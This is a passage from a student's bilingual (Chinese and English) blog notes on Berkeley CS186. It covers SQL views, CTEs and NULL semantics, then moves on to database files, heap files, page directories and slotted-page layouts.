<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Redcount</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> scount</span><br><span class="line">	<span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">	<span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 因为视图是一个虚拟的表，所以这条语句执行的是定义视图时的<span class="keyword">SQL</span>查询</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> Redcount</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> bname, scount</span><br><span class="line"><span class="keyword">FROM</span> Redcount R, Boats2 B  <span class="operator">/</span><span class="operator">/</span> 将视图和Boats2表进行查询</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid</span><br><span class="line"><span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>基于<code>Boats2</code>和<code>Reserves2</code>表，统计了颜色为红色的船只的预订数量，并按船只编号分组</li>
</ul>
<h4 id="Subqueries-in-FROM"><a class="header-anchor" href="#Subqueries-in-FROM">¶</a>Subqueries in FROM</h4>
<ul>
<li>想创建一个只使用一次的“视图”    “即时视图”</li>
<li>define some query in the FROM while define the outer query   定义外部查询时在FROM语句中定义子查询</li>
<li>Like a “view on the fly”</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> bname, scount</span><br><span class="line"><span class="keyword">FROM</span> Boats2 B,</span><br><span class="line">(<span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">	<span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">	<span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid) <span class="keyword">AS</span> Reds(bid, scount)</span><br><span class="line">  <span class="keyword">WHERE</span> Reds.bid <span class="operator">=</span> B.bid   <span class="operator">/</span><span class="operator">/</span> 连接子查询</span><br><span class="line">  	<span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h4 id="With-a-k-a-common-table-expression-CTE"><a class="header-anchor" href="#With-a-k-a-common-table-expression-CTE">¶</a>With a.k.a common table expression(CTE)</h4>
<ul>
<li>CTE   Common Table Expression  公用表表达式</li>
<li>Another “view on the fly” syntax:</li>
<li>在常规查询之前定义子查询，这个子查询可在后面的查询复用</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 定义了Reds这个子查询</span><br><span class="line">	<span class="keyword">WITH</span> Reds(bid, scount) <span class="keyword">AS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span> (<span class="operator">*</span>)</span><br><span class="line">    <span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid)    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">SELECT</span> bname, scount</span><br><span class="line"><span class="keyword">FROM</span> Boats2 B, Reds</span><br><span class="line"><span class="keyword">WHERE</span> Reds.bid <span class="operator">=</span> B.bid</span><br><span class="line"><span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h4 id="Can-have-many-queries-in-WITH"><a class="header-anchor" href="#Can-have-many-queries-in-WITH">¶</a>Can have many queries in WITH</h4>
<ul>
<li>Another “view on the fly” syntax</li>
<li>在常规查询前定义多个子查询，这些子查询也可以相互引用</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">WITH</span> Reds(bid, scount) <span class="keyword">AS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span> (<span class="operator">*</span>)</span><br><span class="line">    <span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid),</span><br><span class="line">    </span><br><span class="line">    UnpopularReds <span class="keyword">AS</span></span><br><span class="line">    <span class="keyword">SELECT</span> bname, scount</span><br><span class="line">    <span class="keyword">FROM</span> Boats2 B, Reds</span><br><span class="line">    <span class="keyword">WHERE</span> Reds.bid <span class="operator">=</span> B.bid</span><br><span class="line">    <span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> UnpopularReds;</span><br></pre></td></tr></table></figure>
<h4 id="Example-ARGMAX-GROUP-BY"><a class="header-anchor" href="#Example-ARGMAX-GROUP-BY">¶</a>Example: ARGMAX GROUP BY?</h4>
<ul>
<li>The sailor with the highest rating per age  找出每个年龄段最高的rating值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">WITH</span> maxratings(age, maxrating) <span class="keyword">AS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> age, <span class="built_in">max</span>(rating)</span><br><span class="line">	<span class="keyword">FROM</span> Sailors</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> age)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">SELECT</span> S.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S, maxratings m</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">=</span> m.age</span><br><span class="line"><span class="keyword">AND</span> S.rating <span class="operator">=</span> m.maxrating</span><br></pre></td></tr></table></figure>
<h3 id="Testing-SQL-Queries"><a class="header-anchor" href="#Testing-SQL-Queries">¶</a>Testing SQL Queries</h3>
<ul>
<li>Not every database instance will reveal every bug in your query
<ul>
<li>Eg: database instance without any rows in it</li>
</ul>
</li>
<li>Need to debug your queries</li>
<li>reasoning about them carefully</li>
<li>constructing test data</li>
</ul>
<h3 id="Brief-Detour-Null-Values"><a class="header-anchor" href="#Brief-Detour-Null-Values">¶</a>Brief Detour: Null Values</h3>
<ul>
<li>Field values are sometimes unknown
<ul>
<li>SQL provides a special value NULL for such situations</li>
<li>every data type can be NULL</li>
</ul>
</li>
<li>The presence of null complicates many issues. E.g.:  有时有NULL会变得复杂
<ul>
<li>Selection predicates(<code>WHERE</code>)   <code>NULL</code>如何与<code>WHERE</code>子句交互</li>
<li>Aggregation    聚合</li>
</ul>
</li>
<li>But NULLs comes naturally from Outer joins  NULL无法避免，NULL来自外部连接</li>
</ul>
<h4 id="NULL-in-the-WHERE-clause"><a class="header-anchor" href="#NULL-in-the-WHERE-clause">¶</a>NULL in the WHERE clause</h4>
<h5 id="Example"><a class="header-anchor" href="#Example">¶</a>Example</h5>
<ul>
<li>
<p>Consider a tuple where rating IS NULL</p>
</li>
<li>
<pre><code class="language-sql">INSERT INTO sailors VALUES
(11, 'Jack Sparrow', NULL, 35);

SELECT * FROM sailors
WHERE rating &gt; 8;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- Is Jack Sparrow in the output?    --The result is yes/no 有/没有，答案不能是含糊的</span><br><span class="line"></span><br><span class="line">#### NULL in comparators</span><br><span class="line"></span><br><span class="line">- 比较器中的NULL</span><br><span class="line">- Rules: (x op NULL) evaluates to ... NULL!</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">SELECT rating = NULL FROM sailors;</span><br><span class="line">SELECT rating &lt; NULL FROM sailors;</span><br><span class="line">SELECT rating &gt;= NULL FROM sailors;</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>每行SELECT语句返回的都是NULL</p>
</li>
</ul>
<h4 id="Explicit-NULL-Checks"><a class="header-anchor" href="#Explicit-NULL-Checks">¶</a>Explicit NULL Checks</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>显式NULL检查</li>
<li>当将字段与NULL进行比较时，使用<code>IS NULL</code>/<code>IS NOT NULL</code> 而不是等号，返回值为<code>true/false</code></li>
</ul>
<h4 id="NULL-at-top-of-WHERE"><a class="header-anchor" href="#NULL-at-top-of-WHERE">¶</a>NULL at top of WHERE</h4>
<ul>
<li>Rule: Do not output a tuple WHERE NULL</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="operator">&gt;</span> <span class="number">8</span>;  <span class="operator">/</span><span class="operator">/</span> <span class="keyword">NULL</span> <span class="operator">&gt;</span> <span class="number">8</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="operator">&lt;=</span> <span class="number">8</span>;  <span class="operator">/</span><span class="operator">/</span> <span class="keyword">NULL</span> <span class="operator">&lt;=</span> <span class="number">8</span></span><br></pre></td></tr></table></figure>
<ul>
<li>二三句查询语句的结果都是NULL，因此结果不会输出</li>
</ul>
<h4 id="NULL-in-boolean-Logic"><a class="header-anchor" href="#NULL-in-boolean-Logic">¶</a>NULL in boolean Logic</h4>
<ul>
<li>布尔逻辑中的NULL</li>
<li>SQL遵循三值逻辑：<code>True</code> / <code>False</code> / <code>NULL</code></li>
</ul>
<table>
<thead>
<tr>
<th>not</th>
<th>t</th>
<th>f</th>
<th>n</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>F</td>
<td>T</td>
<td>N</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>AND</th>
<th>T</th>
<th>F</th>
<th>N</th>
</tr>
</thead>
<tbody>
<tr>
<td>T</td>
<td>T</td>
<td>F</td>
<td>N</td>
</tr>
<tr>
<td>F</td>
<td>F</td>
<td>F</td>
<td>F</td>
</tr>
<tr>
<td>N</td>
<td>N</td>
<td>F</td>
<td>N</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>OR</th>
<th>T</th>
<th>F</th>
<th>N</th>
</tr>
</thead>
<tbody>
<tr>
<td>T</td>
<td>T</td>
<td>T</td>
<td>T</td>
</tr>
<tr>
<td>F</td>
<td>T</td>
<td>F</td>
<td>N</td>
</tr>
<tr>
<td>N</td>
<td>T</td>
<td>N</td>
<td>N</td>
</tr>
</tbody>
</table>
<ul>
<li>General rule:
<ul>
<li>NULL can take on either T or F, so answer needs to accommodate either value   NULL可以代表TRUE或FALSE，因此任何包含NULL的布尔表达式的结果都需要 能够适应这两种可能的值（好奇妙啊</li>
</ul>
</li>
</ul>
<h4 id="NULL-and-Aggregation"><a class="header-anchor" href="#NULL-and-Aggregation">¶</a>NULL and Aggregation</h4>
<ul>
<li>General rule:
<ul>
<li>NULL <strong>column values</strong> are ignored by aggregate functions   聚合函数在处理输出时会忽略列中的NULL值。如果某个列的值是NULL，则其不会对聚合函数的结果产生影响（值都不知道啊不知道干脆忽视吧^^</li>
</ul>
</li>
</ul>
<h4 id="NULLs-Summary"><a class="header-anchor" href="#NULLs-Summary">¶</a>NULLs: Summary</h4>
<ul>
<li>(x op NULL) is NULL</li>
<li>WHERE NULL: do not send to output</li>
<li>Boolean connectives: 3-valued logic</li>
<li>Aggregates ignore NULL-valued inputs</li>
</ul>
<h2 id="Summary"><a class="header-anchor" href="#Summary">¶</a>Summary</h2>
<ul>
<li>SQL is a declarative language    声明式语言
<ul>
<li>Somebody has to translate to algorithms though   需要将其翻译成算法</li>
<li>The RDBMS implementor … i.e. you   自分=数据库管理系统的实现者</li>
</ul>
</li>
<li>The data structure and algorithms that make SQL possible also power:  SQL背后的数据结构和算法也支持：
<ul>
<li>NoSQL, data mining, scalable ML, network routing   NoSQL、数据挖掘、可扩展的机器学习、网络路由</li>
<li>A toolbox for scalable computing   一套用于可扩展计算的工具箱</li>
</ul>
</li>
<li>Temporarily skirted questions of good database(schema) design   后续继续讨论数据库（架构）设计的问题
<ul>
<li>a topic we ‘ll consider in greater depth later’</li>
</ul>
</li>
</ul>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
<p>课的知识密度很高，算算时长两节课才两个多小时可能，我tm看了两三天。。。需要停一停沉淀一下了</p>
<p>哔哔：</p>
<p>感觉没什么东西能真正留住我，是我想留下，所以才给自己硬栓了一条绳子。但是刚刚，产生了五分钟拴不住的念头</p>
<p>可能是学累了吧嘿嘿</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL4 Disks, Files and Buffers I</title>
    <url>/2024/07/13/CS_Notes/Database/CS186%20SQL4%20Disks,%20Files%20and%20Buffers%20I/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<ul>
<li>对应的视频链接地址：
<ul>
<li>本次第一部分：<a href="https://www.youtube.com/watch?v=XXGmqV1gIug&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=31">Lec 4 5 Part 1 Files (youtube.com)</a></li>
</ul>
</li>
</ul>
<h2 id="SQL-4"><a class="header-anchor" href="#SQL-4">¶</a>SQL 4</h2>
<h3 id="Overview-Files-of-Pages-of-Records"><a class="header-anchor" href="#Overview-Files-of-Pages-of-Records">¶</a>Overview: Files of Pages of Records</h3>
<ul>
<li><strong>Tables</strong> stored as logical files   在数据库中，表通常被视为逻辑上的文件，它们是数据的逻辑存储单元
<ul>
<li>Consist of <strong>pages</strong>    由页面组成
<ul>
<li>Pages contain a collection of <strong>records</strong>   页面包含一系列记录</li>
</ul>
</li>
</ul>
</li>
<li>Pages are managed    页面管理
<ul>
<li>On disk by the disk space manager: pages read / written to physical disk/files    磁盘空间管理器在磁盘上：页面被读取/写入到物理磁盘/文件</li>
<li>In memory by the buffer manager: higher levels of DBMS only operate in memory    缓冲区管理器在内存中：数据库管理系统的更高层次仅在内存中操作</li>
</ul>
</li>
</ul>
<h3 id="Database-Files-Files-of-Pages-of-Records"><a class="header-anchor" href="#Database-Files-Files-of-Pages-of-Records">¶</a>Database Files (Files of Pages of Records)</h3>
<ul>
<li>
<p>数据库文件（记录页文件）</p>
</li>
<li>
<p><strong><u>DB FILE</u></strong>: A collection of pages, each containing a collection of records  数据库文件：页面集合，每页包含一组记录</p>
</li>
<li>
<p>API for higher layers of the DBMS    为数据库管理系统的更高层提供API</p>
<ul>
<li>Insert / delete / modify record   增删查改</li>
<li>Fetch a particular record by record id   通过记录ID获取特定记录
<ul>
<li>Record id is a pointer encoding pair of (pageID, location on page)    记录ID是一个指针，编码为（页面ID，页面上的位置）</li>
</ul>
</li>
<li>Scan all records    扫描所有记录
<ul>
<li>Possibly with some conditions on the records to be retrieved      对要检索的记录有一些条件</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Could span multiple OS files and even  machines   跨越多个操作系统文件甚至机器</p>
<ul>
<li>Or “raw” disk devices    或“原始”磁盘设备</li>
</ul>
</li>
</ul>
<h3 id="Many-DB-File-Structure"><a class="header-anchor" href="#Many-DB-File-Structure">¶</a>Many DB File Structure</h3>
<ul>
<li>
<p>数据库文件结构</p>
</li>
<li>
<p>数据库中的文件本身可以以多种方式构建</p>
</li>
<li>
<p>Unordered Heap Files   无序堆文件</p>
<ul>
<li>Records placed arbitrarily across pages   记录以没有特定顺序的方式任意放置在各个页面中</li>
</ul>
</li>
<li>
<p>Clustered Heap Files    集群堆文件</p>
<ul>
<li>Records and pages are grouped  记录和页面被分组为具有相似值的记录</li>
</ul>
</li>
<li>
<p>Sorted Files   排序的文件</p>
<ul>
<li>Pages and records are in sorted order   页面和记录以特定顺序保存</li>
</ul>
</li>
<li>
<p>Index Files   索引文件</p>
<ul>
<li>本质上是基于磁盘的数据结构，用于对数据进行查找</li>
<li>B+ Trees, Linear Hashing    B+ 树、线性哈希</li>
<li>May contain records or point to records in other files    本身可能包含记录 / 包含指向其他文件中的记录的指针</li>
</ul>
</li>
</ul>
<h4 id="Unordered-Heap-Files-（无序堆文件）"><a class="header-anchor" href="#Unordered-Heap-Files-（无序堆文件）">¶</a>Unordered Heap Files （无序堆文件）</h4>
<ul>
<li>Collection of records in no particular order   没有特定顺序的记录集合
<ul>
<li>Not to be confused with “heap” data-structure    堆这种数据结构支持高效查找最小值，</li>
</ul>
</li>
<li>As file shrinks / grows, pages (de)allocated   随着文件缩小/增大，页面分配（解除分配）</li>
<li>To support record level operations, we must    为了支持记录级操作
<ul>
<li>Keep track of the pages in a file    跟踪文件中的页面</li>
<li>Keep track of free space on pages    跟踪页面上的可用空间</li>
<li>Keep track of the records on a page   跟踪页面上的记录</li>
</ul>
</li>
</ul>
<h5 id="Heap-File-Implemented-as-List"><a class="header-anchor" href="#Heap-File-Implemented-as-List">¶</a>Heap File Implemented as List</h5>
<ul>
<li>
<p>页眉本身只有两个指针，一个指向没有可用空间的页面链接列表，另一个指向有可用空间的页面链接列表</p>
</li>
<li>
<p>Header page ID and Heap file name stored elsewhere    页眉 ID 和堆文件名存储在其他地方</p>
<ul>
<li>Database catalog    数据库目录</li>
</ul>
</li>
<li>
<p>Each page contains 2 “pointers” plus <strong>free space</strong> and <strong>data</strong>   每个页面包含 2 个“指针”加上 <strong>可用空间</strong> 和 <strong>数据</strong></p>
</li>
<li>
<p>What is wrong with this?    这种设计有缺陷</p>
<ul>
<li>How do I find a page with enough space for a 20 byte records?      如何找到有足够空间容纳 20 字节记录的页面？</li>
<li>目前已知的方法：沿着可用空间页的链接列表走下去，查看其中一个页面是否有20字节。</li>
<li>问题：这样的方法效率较低</li>
</ul>
</li>
<li>
<p>此处缺少一张图   5:09   画面下方的结构图</p>
</li>
</ul>
<h5 id="Better-Use-a-Page-Directory"><a class="header-anchor" href="#Better-Use-a-Page-Directory">¶</a>Better: Use a Page Directory</h5>
<ul>
<li>
<p>使用<strong>页面目录</strong></p>
</li>
<li>
<p>Directory entries include:    目录条目包括</p>
<ul>
<li>#free bytes on the referenced page    引用页面上的<strong>空闲字节数</strong></li>
<li>指向该页面的<strong>指针</strong></li>
</ul>
</li>
<li>
<p>Header pages accessed often → likely in cache   经常访问的标题页 → 可能在RAM的缓存中</p>
</li>
<li>
<p>Finding a page to fit a record required far fewer page     查找适合记录的页面所需的成本要少得多</p>
<ul>
<li>Because: One header page load reveals free space of many pages      因为：一次标题页加载会显示许多页面的可用空间</li>
</ul>
</li>
<li>
<p>You can imagine optimizing the page directory further     进一步优化页面目录→可能通过压缩或将其放入更复杂的数据结构中</p>
<ul>
<li>But diminishing returns?     为了少量的Header页覆盖大量数据空间，不划算</li>
</ul>
</li>
<li>
<p>此处缺少一张图 5:51   画面右侧</p>
</li>
</ul>
<h4 id="Summary"><a class="header-anchor" href="#Summary">¶</a>Summary</h4>
<ul>
<li>Table encoded as files which are collections of pages    表格被编码为页面集合的文件</li>
<li>表table是一个逻辑对象，但在磁盘上编码为文件，且文件本身是页面page的集合</li>
</ul>
<h3 id="Page-Layout"><a class="header-anchor" href="#Page-Layout">¶</a>Page Layout</h3>
<ul>
<li>单个页面的布局</li>
</ul>
<h4 id="Page-Basics-The-Header"><a class="header-anchor" href="#Page-Basics-The-Header">¶</a>Page Basics: The Header</h4>
<ul>
<li>
<p>页面标题区域可能包含以下内容</p>
</li>
<li>
<p>Header may contain:</p>
<ul>
<li>Number of records     页面包含的记录总数</li>
<li>Free space    页面上的可用空间</li>
<li>Maybe a next / last pointer   指向链接列表中下一个/最后一个页面的指针</li>
<li>Bitmaps, Slot Table   位图、插槽表  用于查找页面上的可用空间</li>
</ul>
</li>
</ul>
<h4 id="Things-to-Address"><a class="header-anchor" href="#Things-to-Address">¶</a>Things to Address</h4>
<ul>
<li>
<p>需要在<strong>页面设计</strong>中解决的问题</p>
</li>
<li>
<p>Record length? Fixed√ or Variable        固定长度页面：记录records都有相同的长度     可变长度页面：记录records长度不同</p>
</li>
<li>
<p>需要判断<strong>页面长度是否可变</strong>→来设计不同的页面布局</p>
</li>
<li>
<p>Find records by record id ?     通过记录的ID查找记录</p>
<ul>
<li>Record id = (Page, Location in Page)</li>
<li>同时还需要使ID随着时间推移而保持稳定</li>
</ul>
</li>
<li>
<p>How do we add and delete records?</p>
</li>
</ul>
<h4 id="Options-for-Page-Layouts"><a class="header-anchor" href="#Options-for-Page-Layouts">¶</a>Options for Page Layouts</h4>
<ul>
<li>
<p>页面布局过程中的选择</p>
</li>
<li>
<p>Depends on</p>
<ul>
<li>Record length (fixed or variable)   记录长度是否可变</li>
<li>Page packing (packed or unpacked)   页面是否根据其可用空间进行打包/解包</li>
</ul>
</li>
</ul>
<h4 id="A-Note-On-Imagery"><a class="header-anchor" href="#A-Note-On-Imagery">¶</a>A Note On Imagery</h4>
<ul>
<li>
<p>尝试展示页面的图片（？</p>
</li>
<li>
<p>Data is stored in linear order    数据以线性顺序存储在磁盘上</p>
<ul>
<li>1 byte per position    页面上每个位置都是1字节内存地址</li>
<li>Memory addresses are ordered    有序的内存地址</li>
<li>Disk addresses are ordered   有序的磁盘地址</li>
</ul>
</li>
<li>
<p>This doesn’t fit nicely on screen  但是长长的一条，没法展示在屏幕上</p>
<ul>
<li>So we will “wrap around” the linear order into a rectangle   改进成矩形的内存区域/磁盘页面区域</li>
</ul>
</li>
<li>
<p>此处缺一张图   2:06  <a href="https://www.youtube.com/watch?v=z26fEmCYdIQ&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=32">Lec 4 5 Part 2 Pages for Fixed Length (youtube.com)</a></p>
</li>
</ul>
<h4 id="Fixed-Length-Records-Packed"><a class="header-anchor" href="#Fixed-Length-Records-Packed">¶</a>Fixed Length Records: Packed</h4>
<ul>
<li>Pack records densely    记录在固定长度的页头之后密集地打包在页面</li>
<li>将记录ID存储为偏移量   从距页头的字节偏移量开始  字节数加上record的长度</li>
<li>Record id = (pageId, “location in page”)?
<ul>
<li>(pageId, record number in page)!</li>
<li>We know the offset from start of page</li>
<li>举例：Record id: (Page 2, Record 4)</li>
</ul>
</li>
<li>Easy to add: just append   计算空闲位置在哪里，然后把记录加到末尾就行了</li>
<li>Delete?
<ul>
<li>Packed implies re-arrange    删除记录，需要重新打包界面</li>
<li>Record Id pointers need to be updated   记录id的指针也需要更新
<ul>
<li>Could be expensive if they 're in other files   如果这些指针存储在数据库的其他文件夹中，需要的成本就更高</li>
</ul>
</li>
</ul>
</li>
<li>结构图就是Page Header为头指针的单向链表，后面跟着每条记录，连接下一条record</li>
<li>此处缺一张图  2:15   <a href="https://www.youtube.com/watch?v=z26fEmCYdIQ&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=32">(16) Lec 4 5 Part 2 Pages for Fixed Length - YouTube</a></li>
</ul>
<h4 id="Fixed-Length-Records-Unpacked"><a class="header-anchor" href="#Fixed-Length-Records-Unpacked">¶</a>Fixed Length Records: Unpacked</h4>
<ul>
<li>
<p>未打包布局+固定长度记录</p>
</li>
<li>
<p>Bitmap denotes “slots” with records    额外成本：在页眉保留一个位图，这个位图将为页面上的每种插槽提供一个位，并且记录ID</p>
</li>
<li>
<p>位图作用：跟踪页面上的空白和完整空间</p>
</li>
<li>
<p>Record id: record number in page</p>
</li>
<li>
<p><strong>Insert</strong>: find first empty slot    需要插入record时，在位图中找到第一个空槽，将记录插入其中并将位图该处标记为已满</p>
</li>
<li>
<p><strong>Delete</strong>: Clear bit    将位图中对应的槽标记为空，则该处对应的数据就不存在了     好处是不用改变指针，因为unpacked</p>
</li>
<li>
<p>还有个好处：固定长度记录的页面上没有浪费任何空间，新记录可以插入先前删除记录留下的孔中</p>
</li>
<li>
<p>比起固定长度+packed方法，就多了bitmap位图这一部分的开销，且更稳定【better choice】</p>
</li>
<li>
<p>此处缺一张图  4:00   <a href="https://www.youtube.com/watch?v=z26fEmCYdIQ&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=32">(16) Lec 4 5 Part 2 Pages for Fixed Length - YouTube</a></p>
</li>
</ul>
<h4 id="Variable-Length-Records"><a class="header-anchor" href="#Variable-Length-Records">¶</a>Variable Length Records</h4>
<ul>
<li>可变长度记录</li>
<li>How do we know where each record begins?   查找记录开始的位置</li>
<li>What happens when we add and delete records?   增删记录时发生</li>
</ul>
<h4 id="First-Relocate-metadata-to-footer"><a class="header-anchor" href="#First-Relocate-metadata-to-footer">¶</a>First: Relocate metadata to footer</h4>
<ul>
<li>此处缺一张图   <a href="https://www.youtube.com/watch?v=SCETMNSHGis&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=33">Lec 4 5 Part 3 Pages for Variable Length (youtube.com)</a>   0:51</li>
<li>把元数据放在页面末尾的页脚footer，不放页面的开头</li>
</ul>
<h4 id="Slotted-Page"><a class="header-anchor" href="#Slotted-Page">¶</a>Slotted Page</h4>
<ul>
<li>
<p>此处缺一张图   <a href="https://www.youtube.com/watch?v=SCETMNSHGis&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=33">Lec 4 5 Part 3 Pages for Variable Length (youtube.com)</a>   1:19</p>
</li>
<li>
<p>Introduce slot directory in footer    在页脚引入槽位目录</p>
<ul>
<li>Pointer to free space    空闲空间指针</li>
<li>Length + Pointer to beginning of record      长度+指向记录开始的指针
<ul>
<li>reverse order    倒序</li>
</ul>
</li>
<li>Record ID = Location in slot table    记录ID =在槽位表中的位置
<ul>
<li>from right   槽位的顺序是从右到左</li>
</ul>
</li>
<li>Delete record (page2, record 4): set 4th slot directory pointer to null    删除某条记录，就直接删除其在槽位中的对应指针
<ul>
<li>doesn’t affect pointers to other records   而不会影响槽位内的其他指针</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Slotted-Page-Insert-Record"><a class="header-anchor" href="#Slotted-Page-Insert-Record">¶</a>Slotted Page: Insert Record</h4>
<ul>
<li>Insert:
<ul>
<li>Place record in free space on page    将记录放置在页面的空闲空间中</li>
<li>Create pointer/length pair in next open slot in slot directory     在slot目录下一个空槽中创建指针/长度对</li>
<li>Update the free space pointer    更新空闲空间指针</li>
<li>fragmentation?   对于碎片化空间的处理？→合并
<ul>
<li>reorganize data on page    将所有输出重新打包，然后更改指针来反映记录的新位置</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Slotted-Page-Leading-Questions"><a class="header-anchor" href="#Slotted-Page-Leading-Questions">¶</a>Slotted Page: Leading Questions</h4>
<ul>
<li>Recognize data on page
<ul>
<li>Safe?
<ul>
<li>√ records ids don’t change</li>
</ul>
</li>
</ul>
</li>
<li>When should reorganize?
<ul>
<li>coudl re-organize on delete    有删除记录后，可以重新organize</li>
<li>or wait until fragmentation blocks record addition and then reorganize    等到碎片块记录添加，然后重新组织</li>
<li>Often pays to be a little sloppy if page never gets more records     如果页面没有得到更多的记录，那么有点马虎通常是有好处的</li>
</ul>
</li>
</ul>
<h4 id="Slotted-Page-Growing-Slots"><a class="header-anchor" href="#Slotted-Page-Growing-Slots">¶</a>Slotted Page: Growing Slots</h4>
<ul>
<li>
<p>插槽页面:增长插槽</p>
</li>
<li>
<p>Tracking number of slots in slot directory    跟踪槽位目录中的槽位数</p>
<ul>
<li>Empty of full</li>
</ul>
</li>
<li>
<p>Extend number of slots in slot directory   扩展槽位目录的槽位数</p>
<ul>
<li>Slots grow from end of page inward    槽从页尾向内生长</li>
<li>Records grow from beginning of page inward   记录从页面开始向内增长</li>
<li>if we need more slots    当插槽用完，但是页面仍有剩余空间
<ul>
<li>可以将另一个槽插入到当前槽的槽位中</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Slotted-Page-Summary"><a class="header-anchor" href="#Slotted-Page-Summary">¶</a>Slotted Page: Summary</h4>
<ul>
<li>Typically use Slotted Page     通常使用开槽页
<ul>
<li>Good for variable and fixed length records    适用于可变和固定长度的记录</li>
</ul>
</li>
